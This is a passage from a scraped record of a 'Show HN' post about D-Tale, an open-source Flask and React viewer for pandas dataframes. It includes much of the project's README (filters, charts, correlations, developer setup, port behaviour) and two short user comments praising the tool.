{'active': True, 'value': 3, 'color': {'r': 245, 'g': 166, 'b': 35, 'a': 1}}, # orange } vertical_headers If set to True then the headers in your grid will be rotated 90 degrees vertically to conserve width. Predefined Filters Users can build their own custom filters which can be used from the front-end using the following code snippet: import pandas as pd import dtale import dtale.predefined_filters as predefined_filters import dtale.global_state as global_state global_state.set_app_settings(dict(open_predefined_filters_on_startup=True)) predefined_filters.set_filters([ { \"name\": \"A and B > 2\", \"column\": \"A\", \"description\": \"Filter A with B greater than 2\", \"handler\": lambda df, val: df[(df[\"A\"] == val) & (df[\"B\"] > 2)], \"input_type\": \"input\", \"default\": 1, \"active\": False, }, { \"name\": \"A and (B % 2) == 0\", \"column\": \"A\", \"description\": \"Filter A with B mod 2 equals zero (is even)\", \"handler\": lambda df, val: df[(df[\"A\"] == val) & (df[\"B\"] % 2 == 0)], \"input_type\": \"select\", \"default\": 1, \"active\": False, }, { \"name\": \"A in values and (B % 2) == 0\", \"column\": \"A\", \"description\": \"A is within a group of values and B mod 2 equals zero (is even)\", \"handler\": lambda df, val: df[df[\"A\"].isin(val) & (df[\"B\"] % 2 == 0)], \"input_type\": \"multiselect\", \"default\": [1], \"active\": True, } ]) df = pd.DataFrame( ([[1, 2, 3, 4, 5, 6], [7, 8, 9, 10, 11, 12], [13, 14, 15, 16, 17, 18]]), columns=['A', 'B', 'C', 'D', 'E', 'F'] ) dtale.show(df) This code illustrates the types of inputs you can have on the front end: input: just a simple text input box which users can enter any value they want (if the value specified for \"column\" is an int or float it will try to convert the string to that data type) and it will be passed to the handler select: this creates a dropdown populated with the unique values of \"column\" (an asynchronous dropdown if the column has a large amount of unique values) multiselect: same as \"select\" but it will allow you to choose multiple values (handy if you want to perform an isin operation in your filter) Here is a demo of the functionality: If there are any new types of inputs you would like available please don't hesitate to submit a request on the \"Issues\" page of the repo. Using Swifter Swifter is a package which will increase performance on any apply() function on a pandas series or dataframe. If install the package in your virtual environment pip install swifter # or pip install dtale[swifter] It will be used for the following operations: Standard dataframe formatting in the main grid & chart display Column Builders Type Conversions string hex -> int or float int or float -> hex mixed -> boolean int -> timestamp date -> int Similarity Distance Calculation Handling of empty strings when calculating missing counts Building unique values by data type in \"Describe\" popup Accessing CLI Loaders in Notebook or Console I am pleased to announce that all CLI loaders will be available within notebooks & consoles. Here are some examples (the last working if you've installed dtale[arctic]): dtale.show_csv(path='test.csv', parse_dates=['date']) dtale.show_csv(path='http://csv-endpoint', index_col=0) dtale.show_excel(path='test.xlsx', parse_dates=['date']) dtale.show_excel(path='test.xls', sheet=) dtale.show_excel(path='http://excel-endpoint', index_col=0) dtale.show_json(path='http://json-endpoint', parse_dates=['date']) dtale.show_json(path='test.json', parse_dates=['date']) dtale.show_r(path='text.rda') dtale.show_arctic(host='host', library='library', node='node', start_date='20200101', end_date='20200101') UI Once you have kicked off your D-Tale session please copy & paste the link on the last line of output in your browser Dimensions/Ribbon Menu/Main Menu The information in the upper right-hand corner gives grid dimensions lower-left => row count upper-right => column count Ribbon Menu hovering around to top of your browser will display a menu items (similar to the ones in the main menu) across the top of the screen to close the menu simply click outside the menu and/or dropdowns from the menu Main Menu clicking the triangle displays the menu of standard functions (click outside menu to close it) Header The header gives users an idea of what operations have taken place on your data (sorts, filters, hidden columns). These values will be persisted across broswer instances. So if you perform one of these operations and then send a link to one of your colleagues they will see the same thing :) Notice the \"X\" icon on the right of each display. Clicking this will remove those operations. When performing multiple of the same operation the description will become too large to display so the display will truncate the description and if users click it they will be presented with a tooltip where you can crop individual operations. Here are some examples: Sorts Filters Hidden Columns Resize Columns Currently there are two ways which you can resize columns. Dragging the right border of the column's header cell. Altering the \"Maximum Column Width\" property from the ribbon menu. Side Note: You can also set the max_column_width property ahead of time in your global configuration or programmatically using: import dtale.global_state as global_state global_state.set_app_settings(dict(max_column_width=100)) Editing Cells You may edit any cells in your grid (with the exception of the row indexes or headers, the ladder can be edited using the Rename column menu function). In order to edit a cell simply double-click on it. This will convert it into a text-input field and you should see a blinking cursor. In addition to turning that cell into an input it will also display an input at the top of the screen for better viewing of long strings. It is assumed that the value you type in will match the data type of the column you editing. For example: integers -> should be a valid positive or negative integer float -> should be a valid positive or negative float string -> any valid string will do category -> either a pre-existing category or this will create a new category for (so beware!) date, timestamp, timedelta -> should be valid string versions of each boolean -> any string you input will be converted to lowercase and if it equals \"true\" then it will make the cell True, otherwise False Users can make use of two protected values as well: \"nan\" -> numpy.nan \"inf\" -> numpy.inf To save your change simply press \"Enter\" or to cancel your changes press \"Esc\". If there is a conversion issue with the value you have entered it will display a popup with the specific exception in question. Here's a quick demo: Here's a demo of editing cells with long strings: Copy Cells Into Clipboard Select Copy Paste One request that I have heard time and time again while working on D-Tale is \"it would be great to be able to copy a range of cells into excel\". Well here is how that is accomplished: Shift + Click on a cell Shift + Click on another cell (this will trigger a popup) Choose whether you want to include headers in your copy by clicking the checkbox Click Yes Go to your excel workbook and execute Ctrl + V or manually choose \"Paste\" You can also paste this into a standard text editor and what you're left with is tab-delimited data Main Menu Functions XArray Operations Convert To XArray: If you have are currently viewing a pandas dataframe in D-Tale you will be given this option to convert your data to an xarray.Dataset. It is as simple as selecting one or many columns as an index and then your dataframe will be converted to a dataset (df.set_index([...]).to_xarray()) which makes toggling between indexes slices much easier. XArray Dimensions: If you are currently viewing data associated with an xarray.Dataset you will be given the ability to toggle which dimension coordinates you're viewing by clicking this button. You can select values for all, some or none (all data - no filter) of your coordinates and the data displayed in your grid will match your selections. Under the hood the code being executed is as follows: ds.sel(dim1=coord1,...).to_dataframe() Describe View all the columns & their data types as well as individual details of each column Data Type Display Notes date string If you have less than or equal to 100 unique values they will be displayed at the bottom of your popup int Anything with standard numeric classifications (min, max, 25%, 50%, 75%) will have a nice boxplot with the mean (if it exists) displayed as an outlier if you look closely. float Outlier Detection When viewing integer & float columns in the \"Describe\" popup you will see in the lower right-hand corner a toggle for Uniques & Outliers. Outliers Filter If you click the \"Outliers\" toggle this will load the top 100 outliers in your column based on the following code snippet: s = df[column] q1 = s.quantile(0.25) q3 = s.quantile(0.75) iqr = q3 - q1 iqr_lower = q1 - 1.5 * iqr iqr_upper = q3 + 1.5 * iqr outliers = s[(s < iqr_lower) | (s > iqr_upper)] If you click on the \"Apply outlier filter\" link this will add an addtional \"outlier\" filter for this column which can be removed from the header or the custom filter shown in picture above to the right. Custom Filter Apply a custom pandas query to your data (link to pandas documentation included in popup) Editing Result You can also see any outlier or column filters you've applied (which will be included in addition to your custom query) and remove them if you'd like. Context Variables are user-defined values passed in via the context_variables argument to dtale.show(); they can be referenced in filters by prefixing the variable name with '@'. For example, here is how you can use context variables in a pandas query: import pandas as pd df = pd.DataFrame([ dict(name='Joe', age=7), dict(name='Bob', age=23), dict(name='Ann', age=45), dict(name='Cat', age=88), ]) two_oldest_ages = df['age'].nlargest(2) df.query('age in @two_oldest_ages') And here is how you would pass that context variable to D-Tale: dtale.show(df, context_variables=dict(two_oldest_ages=two_oldest_ages)) Here's some nice documentation on the performance of pandas queries Dataframe Functions This video shows you how to build the following: Numeric: adding/subtracting two columns or columns with static values Bins: bucketing values using pandas cut & qcut as well as assigning custom labels Dates: retrieving date properties (hour, weekday, month...) as well as conversions (month end) Random: columns of data type (int, float, string & date) populated with random uniformly distributed values. Type Conversion: switch columns from one data type to another, fun. Merge & Stack This feature allows users to merge or stack (vertically concatenate) dataframes they have loaded into D-Tale. They can also upload additional data to D-Tale while wihin this feature. The demo shown above goes over the following actions: Editing of parameters to either a pandas merge or stack (vertical concatenation) of dataframes Viewing direct examples of each from the pandas documentation Selection of dataframes Uploading of additional dataframes from an excel file Viewing code & resulting data from a merge or stack Summarize Data This is very powerful functionality which allows users to create a new data from currently loaded data. The operations currently available are: Aggregation: consolidate data by running different aggregations on columns by a specific index Pivot: this is simple wrapper around pandas.Dataframe.pivot and pandas.pivot_table Transpose: transpose your data on a index (be careful dataframes can get very wide if your index has many unique values) Function Data No Reshaping Duplicates Remove duplicate columns/values from your data as well as extract duplicates out into separate instances. The folowing screen shots are for a dataframe with the following data: Function Description Preview Remove Duplicate Columns Remove any columns that contain the same data as another and you can either keep the first, last or none of these columns that match this criteria. You can test which columns will be removed by clicking the \"View Duplicates\" button. Remove Duplicate Column Names Remove any columns with the same name (name comparison is case-insensitive) and you can either keep the first, last or none of these columns that match this criteria. You can test which columns will be removed by clicking the \"View Duplicates\" button. Remove Duplicate Rows Remove any rows from your dataframe where the values of a subset of columns are considered duplicates. You can choose to keep the first, last or none of the rows considered duplicated. Show Duplicates Break any duplicate rows (based on a subset of columns) out into another dataframe viewable in your D-Tale session. You can choose to view all duplicates or select specific groups based on the duplicated value. Missing Analysis Display charts analyzing the presence of missing (NaN) data in your dataset using the missingno pacakage. You can also open them in a tab by themselves or export them to a static PNG using the links in the upper right corner. You can also close the side panel using the ESC key. Chart Sample Matrix Bar Heatmap Dendrogram Charts Build custom charts based off your data(powered by plotly/dash). The Charts will open in a tab because of the fact there is so much functionality offered there you'll probably want to be able to reference the main grid data in the original tab To build a chart you must pick a value for X & Y inputs which effectively drive what data is along the X & Y axes If you are working with a 3-Dimensional chart (heatmap, 3D Scatter, Surface) you'll need to enter a value for the Z axis as well Once you have entered all the required axes a chart will be built If your data along the x-axis (or combination of x & y in the case of 3D charts) has duplicates you have three options: Specify a group, which will create series for each group Specify an aggregation, you can choose from one of the following: Count, First, Last, Mean, Median, Minimum, Maximum, Standard Deviation, Variance, Mean Absolute Deviation, Product of All Items, Sum, Rolling Specifying a \"Rolling\" aggregation will also require a Window & a Computation (Correlation, Count, Covariance, Kurtosis, Maximum, Mean, Median, Minimum, Skew, Standard Deviation, Sum or Variance) For heatmaps you will also have access to the \"Correlation\" aggregation since viewing correlation matrices in heatmaps is very useful. This aggregation is not supported elsewhere Specify both a group & an aggregation You now have the ability to toggle between different chart types: line, bar, pie, wordcloud, heatmap, 3D scatter & surface If you have specified a group then you have the ability between showing all series in one chart and breaking each series out into its own chart \"Chart per Group\" Here are some examples: Chart Type Chart Chart per Group line bar stacked pie wordcloud heatmap 3D scatter surface Maps (Scatter GEO) Maps (Choropleth) Y-Axis Toggling Users now have the ability to toggle between 3 different behaviors for their y-axis display: Default: selecting this option will use the default behavior that comes with plotly for your chart's y-axis Single: this allows users to set the range of all series in your chart to be on the same basis as well as making that basis (min/max) editable Multi: this allows users to give each series its own y-axis and making that axis' range editable Here's a quick tutorial: And some screenshots: Default Single Multi With a bar chart that only has a single Y-Axis you have the ability to sort the bars based on the values for the Y-Axis Pre-sort Post-sort Popup Charts Viewing multiple charts at once and want to separate one out into its own window or simply move one off to the side so you can work on building another for comparison? Well now you can by clicking the \"Popup\" button Copy Link Want to send what you're looking at to someone else? Simply click the \"Copy Link\" button and it will save a pre-populated chart URL into your clipboard. As long as your D-Tale process is still running when that link is opened you will see your original chart. Exporting Charts You can now export your dash charts (with the exception of Wordclouds) to static HTML files which can be emailed to others or saved down to be viewed at a later time. The best part is that all of the javascript for plotly is embedded in these files so the nice zooming, panning, etc is still available! Exporting CSV I've been asked about being able to export the data that is contained within your chart to a CSV for further analysis in tools like Excel. This button makes that possible. OFFLINE CHARTS Want to run D-Tale in a jupyter notebook and build a chart that will still be displayed even after your D-Tale process has shutdown? Now you can! Here's an example code snippet show how to use it: import dtale def test_data(): import random import pandas as pd import numpy as np df = pd.DataFrame([ dict(x=i, y=i % 2) for i in range(30) ]) rand_data = pd.DataFrame(np.random.randn(len(df), 5), columns=['z{}'.format(j) for j in range(5)]) return pd.concat([df, rand_data], axis=1) d = dtale.show(test_data()) d.offline_chart(chart_type='bar', x='x', y='z3', agg='sum') Pro Tip: If generating offline charts in jupyter notebooks and you run out of memory please add the following to your command-line when starting jupyter --NotebookApp.iopub_data_rate_limit=1.0e10 Disclaimer: Long Running Chart Requests If you choose to build a chart that requires a lot of computational resources then it will take some time to run. Based on the way Flask & plotly/dash interact this will block you from performing any other request until it completes. There are two courses of action in this situation: Restart your jupyter notebook kernel or python console Open a new D-Tale session on a different port than the current session. You can do that with the following command: dtale.show(df, port=[any open port], force=True) If you miss the legacy (non-plotly/dash) charts, not to worry! They are still available from the link in the upper-right corner, but on for a limited time... Here is the documentation for those: Legacy Charts Your Feedback is Valuable This is a very powerful feature with many more features that could be offered (linked subplots, different statistical aggregations, etc...) so please submit issues :) Network Viewer This tool gives users the ability to visualize directed graphs. For the screenshots I'll beshowing for this functionality we'll be working off a dataframe with the following data: Start by selecting columns containing the \"To\" and \"From\" values for the nodes in you network and then click \"Load\": You can also see instructions on to interact with the network by expanding the directions section by clicking on the header \"Network Viewer\" at the top. You can also view details about the network provided by the package networkx by clicking the header \"Network Analysis\". Select a column containing weighting for the edges of the nodes in the \"Weight\" column and click \"Load\": Select a column containing group information for each node in the \"From\" column by populating \"Group\" and then clicking \"Load\": Perform shortest path analysis by doing a Shift+Click on two nodes: View direct descendants of each node by clicking on it: You can zoom in on nodes by double-clicking and zoom back out by pressing \"Esc\". Correlations Shows a pearson correlation matrix of all numeric columns against all other numeric columns By default, it will show a grid of pearson correlations (filtering available by using drop-down see 2nd table of screenshots) If you have a date-type column, you can click an individual cell and see a timeseries of pearson correlations for that column combination Currently if you have multiple date-type columns you will have the ability to toggle between them by way of a drop-down Furthermore, you can click on individual points in the timeseries to view the scatter plot of the points going into that correlation Within the scatter plot section you can also view the details of the PPS for those data points in the chart by hovering over the number next to \"PPS\" Matrix PPS Timeseries Scatter Col1 Filtered Col2 Filtered Col1 & Col2 Filtered When the data being viewed in D-Tale has date or timestamp columns but for each date/timestamp vlaue there is only one row of data the behavior of the Correlations popup is a little different Instead of a timeseries correlation chart the user is given a rolling correlation chart which can have the window (default: 10) altered The scatter chart will be created when a user clicks on a point in the rollign correlation chart. The data displayed in the scatter will be for the ranges of dates involved in the rolling correlation for that date. Data Correlations Predictive Power Score Predictive Power Score (using the package ppscore) is an asymmetric, data-type-agnostic score that can detect linear or non-linear relationships between two columns. The score ranges from 0 (no predictive power) to 1 (perfect predictive power). It can be used as an alternative to the correlation (matrix). WARNING: This could take a while to load. This page works similar to the Correlations page but uses the PPS calcuation to populate the grid and by clicking on cells you can view the details of the PPS for those two columns in question. | Heat Map This will hide any non-float or non-int columns (with the exception of the index on the right) and apply a color to the background of each cell. Each float is renormalized to be a value between 0 and 1.0 You have two options for the renormalization By Col: each value is calculated based on the min/max of its column Overall: each value is caluclated by the overall min/max of all the non-hidden float/int columns in the dataset Each renormalized value is passed to a color scale of red(0) - yellow(0.5) - green(1.0) Turn off Heat Map by clicking menu option you previously selected one more time Highlight Dtypes This is a quick way to check and see if your data has been categorized correctly. By clicking this menu option it will assign a specific background color to each column of a specific data type. category timedelta float int date string bool purple orange green light blue pink white yellow Highlight Missing Any cells which contain nan values will be highlighted in yellow. Any string column cells which are empty strings or strings consisting only of spaces will be highlighted in orange. will be prepended to any column header which contains missing values. Highlight Outliers Highlight any cells for numeric columns which surpass the upper or lower bounds of a custom outlier computation. Lower bounds outliers will be on a red scale, where the darker reds will be near the maximum value for the column. Upper bounds outliers will be on a blue scale, where the darker blues will be closer to the minimum value for the column. will be prepended to any column header which contains outliers. Highlight Range Highlight any range of numeric cells based on three different criteria: equals greater than less than You can activate as many of these criteria as you'd like nad they will be treated as an \"or\" expression. For example, (x == 0) or (x < -1) or (x > 1) Selections Output Low Variance Flag Show flags on column headers where both these conditions are true: Count of unique values / column size < 10% Count of most common value / Count of second most common value > 20 Here's an example of what this will look like when you apply it: | Code Exports Code Exports are small snippets of code representing the current state of the grid you're viewing including things like: columns built filtering sorting Other code exports available are: Describe (Column Analysis) Correlations (grid, timeseries chart & scatter chart) Charts built using the Chart Builder Type Code Export Main Grid Histogram Describe Correlation Grid Correlation Timeseries Correlation Scatter Charts Export CSV Export your current data to either a CSV or TSV file: Load Data & Sample Datasets So either when starting D-Tale with no pre-loaded data or after you've already loaded some data you now have the ability to load data or choose from some sample datasets directly from the GUI: Here's the options at you disposal: Load a CSV/TSV file by dragging a file to the dropzone in the top or select a file by clicking the dropzone Load a CSV/TSV or JSON directly from the web by entering a URL (also throw in a proxy if you are using one) Choose from one of our sample datasets: US COVID-19 data from NY Times (updated daily) Script breakdowns of popular shows Seinfeld & The Simpsons Movie dataset containing release date, director, actors, box office, reviews... Video games and their sales pandas.util.testing.makeTimeDataFrame Instances This will give you information about other D-Tale instances are running under your current Python process. For example, if you ran the following script: import pandas as pd import dtale dtale.show(pd.DataFrame([dict(foo=1, bar=2, biz=3, baz=4, snoopy_D_O_double_gizzle=5)])) dtale.show(pd.DataFrame([ dict(a=1, b=2, c=3, d=4), dict(a=2, b=3, c=4, d=5), dict(a=3, b=4, c=5, d=6), dict(a=4, b=5, c=6, d=7) ])) dtale.show(pd.DataFrame([range(6), range(6), range(6), range(6), range(6), range(6)]), name=\"foo\") This will make the Instances button available in all 3 of these D-Tale instances. Clicking that button while in the first instance invoked above will give you this popup: The grid above contains the following information: Process: timestamp when the process was started along with the name (if specified in dtale.show()) Rows: number of rows Columns: number of columns Column Names: comma-separated string of column names (only first 30 characters, hover for full listing) Preview: this button is available any of the non-current instances. Clicking this will bring up left-most 5X5 grid information for that instance The row highlighted in green signifys the current D-Tale instance Any other row can be clicked to switch to that D-Tale instance Here is an example of clicking the \"Preview\" button: About This will give you information about what version of D-Tale you're running as well as if its out of date to whats on PyPi. Up To Date Out Of Date Refresh Widths Mostly a fail-safe in the event that your columns are no longer lining up. Click this and should fix that Theme Toggle between light & dark themes for your viewing pleasure (only affects grid, not popups or charts). Light Dark Reload Data Force a reload of the data from the server for the current rows being viewing in the grid by clicking this button. This can be helpful when viewing the grid from within another application like jupyter or nested within another website. Unpin/Pin Menu If you would like to keep your menu pinned to the side of your grid all times rather than always having to click the triaangle in the upper left-hand corner simply click this button. It is persisted back to the server so that it can be applied to all piece of data you've loaded into your session and beyond refreshes. Language I am happy to announce that D-Tale now supports both English & Chinese (there is still more of the translation to be completed but the infrastructure is there). And we are happy to add support for any other languages. Please see instruction on how, here. Shutdown Pretty self-explanatory, kills your D-Tale session (there is also an auto-kill process that will kill your D-Tale after an hour of inactivity) Column Menu Functions Filtering These interactive filters come in 3 different types: String, Numeric & Date. Note that you will still have the ability to apply custom filters from the \"Filter\" popup on the main menu, but it will get applied in addition to any column filters. Type Filter Data Types Features String strings & booleans The ability to select multiple values based on what exists in the column. Notice the \"Show Missing Only\" toggle, this will only show up if your column has nan values Date dates Specify a range of dates to filter on based on start & end inputs Numeric ints & floats For integers the \"=\" will be similar to strings where you can select multiple values based on what exists in the column. You also have access to other operands: <,>,<=,>=,() - \"Range exclusve\", [] - \"Range inclusive\". Moving Columns All column movements are saved on the server so refreshing your browser won't lose them Hiding Columns All column movements are saved on the server so refreshing your browser won't lose them Delete As simple as it sounds, click this button to delete this column from your dataframe. Rename Update the name of any column in your dataframe to a name that is not currently in use by your dataframe. Replacements This feature allows users to replace content on their column directly or for safer purposes in a brand new column. Here are the options you have: Type Data Types Description Menu Value(s) all Replace specific values in a column with raw values, output from another column or an aggregation on your column Spaces Only strings Replace string values consisting only of spaces with raw values Contains Char/Substring strings Replace string values containing a specific character or substring Scikit-Learn Imputer numeric Replace missing values with the output of using different Scikit-Learn imputers like iterative, knn & simple Here's a quick demo: Lock Adds your column to \"locked\" columns \"locked\" means that if you scroll horizontally these columns will stay pinned to the right-hand side this is handy when you want to keep track of which date or security_id you're looking at by default, any index columns on the data passed to D-Tale will be locked Unlock Removed column from \"locked\" columns Sorting Applies/removes sorting (Ascending/Descending/Clear) to the column selected Important: as you add sorts they sort added will be added to the end of the multi-sort. For example: Action Sort click \"a\" sort asc a (asc) click \"b\" a (asc) sort desc a (asc), b(desc) click \"a\" a (asc), b(desc) sort None b(desc) sort desc b(desc), a(desc) click \"X\" on sort display Formats Apply simple formats to numeric values in your grid Type Editing Result Numeric Date String For all data types you have the ability to change what string is ued for display. For numbers here's a grid of all the formats available with -123456.789 as input: Format Output Precision (6) -123456.789000 Thousands Sep -123,456.789 Abbreviate -123k Exponent -1e+5 BPS -1234567890BPS Red Negatives -123457 For strings you can apply the follwoing formats: Truncation: truncate long strings to a certain number of characters and replace with an allipses \"...\" and see the whole value on hover. Hyperlinks: If your column is comprised of URL strings you can make them hyperlinks which will open a new tab Describe (Column Analysis) Based on the data type of a column different charts will be shown. This side panel can be closed using the 'X' button in the upper right or by pressing the ESC key. Chart Data Types Sample Box Plot Float, Int, Date Histogram Float, Int Value Counts Int, String, Bool, Date, Category Word Value Counts String Category Float Geolocation* Int, Float Q-Q Plot Int, Float, Date Histogram can be displayed in any number of bins (default: 20), simply type a new integer value in the bins input Value Count by default, show the top 100 values ranked by frequency. If you would like to show the least frequent values simply make your number negative (-10 => 10 least frequent value) Value Count w/ Ordinal you can also apply an ordinal to your Value Count chart by selecting a column (of type int or float) and applying an aggregation (default: sum) to it (sum, mean, etc...) this column will be grouped by the column you're analyzing and the value produced by the aggregation will be used to sort your bars and also displayed in a line. Here's an example: Word Value Count you can analyze string data by splitting each record by spaces to see the counts of each word. This chart has all the same functions available as \"Value Counts\". In addition, you can select multiple \"Cleaner\" functions to be applied to your column before building word values. These functions will perform operations like removing punctuation, removing numeric character & normalizing accent characters. Category (Category Breakdown) when viewing float columns you can also see them broken down by a categorical column (string, date, int, etc...). This means that when you select a category column this will then display the frequency of each category in a line as well as bars based on the float column you're analyzing grouped by that category and computed by your aggregation (default: mean). Geolocation when your data contains latitude & longitude then you can view the coverage in a plotly scattergeo map. In order to have access this chart your dataframe must have at least one of each of these types of columns: \"lat\" must be contained within the lower-cased version of the column name and values be between -90 & 90 \"lon\" must be contained within the lower-cased version of the column name and values be between -180 & 180 Hotkeys These are key combinations you can use in place of clicking actual buttons to save a little time: Keymap Action shift+m Opens main menu* shift+d Opens \"Describe\" page* shift+f Opens \"Custom Filter\"* shift+b Opens \"Build Column\"* shift+c Opens \"Charts\" page* shift+x Opens \"Code Export\"* esc Closes any open modal window or side panel & exits cell editing * Does not fire if user is actively editing a cell. Menu Functions Depending on Browser Dimensions Depending on the dimensions of your browser window the following buttons will not open modals, but rather separate browser windows: Correlations, Describe & Instances (see images from Jupyter Notebook, also Charts will always open in a separate browser window) For Developers Cloning Clone the code (git clone ssh://git@github.com:manahl/dtale.git), then start the backend server: $ git clone ssh://git@github.com:manahl/dtale.git # install the dependencies $ python setup.py develop # start the server $ python dtale --csv-path /home/jdoe/my_csv.csv --csv-parse_dates date You can also run dtale from PyDev directly. You will also want to import javascript dependencies and build the source: $ npm install # 1) a persistent server that serves the latest JS: $ npm run watch # 2) or one-off build: $ npm run build Running tests The usual npm test command works: You can run individual test files: $ TEST=static/__tests__/dtale/DataViewer-base-test.jsx npm run test-file Linting You can lint all the JS and CSS to confirm there's nothing obviously wrong with it: You can also lint individual JS files: $ npm run lint-js-file -s -- static/dtale/DataViewer.jsx Formatting JS You can auto-format code as follows: Docker Development You can build python 27-3 & run D-Tale as follows: $ yarn run build $ docker-compose build dtale_2_7 $ docker run -it --network host dtale_2_7:latest $ python >>> import pandas as pd >>> df = pd.DataFrame([dict(a=1,b=2,c=3)]) >>> import dtale >>> dtale.show(df) Then view your D-Tale instance in your browser using the link that gets printed You can build python 36-1 & run D-Tale as follows: $ yarn run build $ docker-compose build dtale_3_6 $ docker run -it --network host dtale_3_6:latest $ python >>> import pandas as pd >>> df = pd.DataFrame([dict(a=1,b=2,c=3)]) >>> import dtale >>> dtale.show(df) Then view your D-Tale instance in your browser using the link that gets printed Adding Language Support Currently D-Tale support both english & chinese but other languages will gladly be supported. To add another language simply open a pull request with the following: cake a copy & translate the values in the following JSON english JSON files and save them to the same locations as each file Back-End Front-End please make the name of these files the name of the language you are adding (currently english -> en, chinese -> cn) be sure to keep the keys in english, that is important Looking forward to what languages come next! Global State/Data Storage If D-Tale is running in an environment with multiple python processes (ex: on a web server running gunicorn) it will most likely encounter issues with inconsistent state. Developers can fix this by configuring the system D-Tale uses for storing data. Detailed documentation is available here: Data Storage and managing Global State Startup Behavior Here's a little background on how the dtale.show() function works: by default it will look for ports between 40000 & 49000, but you can change that range by specifying the environment variables DTALE_MIN_PORT & DTALE_MAX_PORT think of sessions as python consoles or jupyter notebooks Session 1 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40000 1 http://localhost:40000/dtale/main/1 Session 1 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40000 1,2 http://localhost:40000/dtale/main/[1,2] Session 2 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40000 1,2 http://localhost:40000/dtale/main/[1,2] 2 40001 1 http://localhost:40001/dtale/main/1 Session 1 executes dtale.show(df, port=40001, force=True) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] Session 3 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] 3 40000 1 http://localhost:40000/dtale/main/1 Session 2 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 Session 4 executes dtale.show(df, port=8080) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 4 8080 1 http://localhost:8080/dtale/main/1 Session 1 executes dtale.get_instance(1).kill() our state is: Session Port Active Data IDs URL(s) 1 40001 2,3 http://localhost:40001/dtale/main/[2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 4 8080 1 http://localhost:8080/dtale/main/1 Session 5 sets DTALE_MIN_RANGE to 30000 and DTALE_MAX_RANGE 39000 and executes dtale.show(df) our state is: Session Port Active Data ID(s) URL(s) 1 40001 2,3 http://localhost:40001/dtale/main/[2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 4 8080 1 http://localhost:8080/dtale/main/1 5 30000 1 http://localhost:30000/dtale/main/1 Documentation Have a look at the detailed documentation. Dependencies Back-end dash dash_daq Flask Flask-Compress flask-ngrok Pandas plotly scikit-learn scipy xarray arctic [extra] redis [extra] rpy2 [extra] Front-end react-virtualized chart.js Acknowledgements D-Tale has been under active development at Man Numeric since 2019. Original concept and implementation: Andrew Schonfeld Contributors: Phillip Dupuis Fernando Saravia Rajal Dominik Christ Reza Moshksar Bertrand Nouvel Chris Boddy Jason Holden Tom Taylor Wilfred Hughes Mike Kelly Vincent Riemer Youssef Habchi - title font ... and many others ... Contributions welcome! License D-Tale is licensed under the GNU LGPL v2.1. A copy of which is included in LICENSE ",
          "Nice. Looks like a great solution that I've seen many companies build internally. Glad you open sourced yours.",
          "This is a revolutionary tool for pandas data visualization. It integrates many data processing functionalities with visualization part, which really brings benefit to the end user. Thank you for creating this awesome tool !!!"
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/man-group/dtale",
        "comments.comment_id": [21884647, 21884689],
        "comments.comment_author": ["ewuni", "jasonlocal"],
        "comments.comment_descendants": [1, 0],
        "comments.comment_time": [
          "2019-12-26T15:58:43Z",
          "2019-12-26T16:05:26Z"
        ],
        "comments.comment_text": [
          "Nice. Looks like a great solution that I've seen many companies build internally. Glad you open sourced yours.",
          "This is a revolutionary tool for pandas data visualization. It integrates many data processing functionalities with visualization part, which really brings benefit to the end user. Thank you for creating this awesome tool !!!"
        ],
        "id": "1fc1e99a-74d8-4932-aac3-26a9e2e17ac2",
        "url_text": "Live Demo Animated US COVID-19 Deaths By State 3D Scatter Chart Surface Chart Network Analysis What is it? D-Tale is the combination of a Flask back-end and a React front-end to bring you an easy way to view & analyze Pandas data structures. It integrates seamlessly with ipython notebooks & python/ipython terminals. Currently this tool supports such Pandas objects as DataFrame, Series, MultiIndex, DatetimeIndex & RangeIndex. Origins D-Tale was the product of a SAS to Python conversion. What was originally a perl script wrapper on top of SAS's insight function is now a lightweight web client on top of Pandas data structures. In The News 4 Libraries that can perform EDA in one line of python code React Status KDNuggets Man Institute (warning: contains deprecated functionality) Python Bytes FlaskCon 2020 San Diego Python Medium: towards data science Medium: Exploratory Data Analysis Using D-Tale EOD Notes: Using python and dtale to analyze correlations Data Exploration is Now Super Easy w/ D-Tale Practical Business Python Tutorials Pip Install Python YouTube Channel machine_learning_2019 D-Tale The Best Library To Perform Exploratory Data Analysis Using Single Line Of Code Explore and Analyze Pandas Data Structures w/ D-Tale Data Preprocessing simplest method Related Resources Adventures In Flask While Developing D-Tale Adding Range Selection to react-virtualized Building Draggable/Resizable Modals Embedding Flask Apps within Streamlit Contents Where To Get It Getting Started Python Terminal As A Script Jupyter Notebook Jupyterhub w/ Jupyter Server Proxy Jupyterhub w/ Kubernetes Docker Container Google Colab Kaggle Binder R with Reticulate Startup with No Data Command-line Custom Command-line Loaders Embedding Within Your Own Flask App Embedding Within Your Own Django App Embedding Within Streamlit Running D-Tale On Gunicorn w/ Redis Configuration Authentication Predefined Filters Using Swifter UI Dimensions/Ribbon Menu/Main Menu Header Resize Columns Editing Cells Copy Cells Into Clipboard Main Menu Functions XArray Operations, Describe, Outlier Detection, Custom Filter, Dataframe Functions, Merge & Stack, Summarize Data, Duplicates, Missing Analysis, Correlations, Predictive Power Score, Heat Map, Highlight Dtypes, Highlight Missing, Highlight Outliers, Highlight Range, Low Variance Flag, Instances, Code Exports, Export CSV, Load Data & Sample Datasets, Refresh Widths, About, Theme, Reload Data, Unpin/Pin Menu, Language, Shutdown Column Menu Functions Filtering, Moving Columns, Hiding Columns, Delete, Rename, Replacements, Lock, Unlock, Sorting, 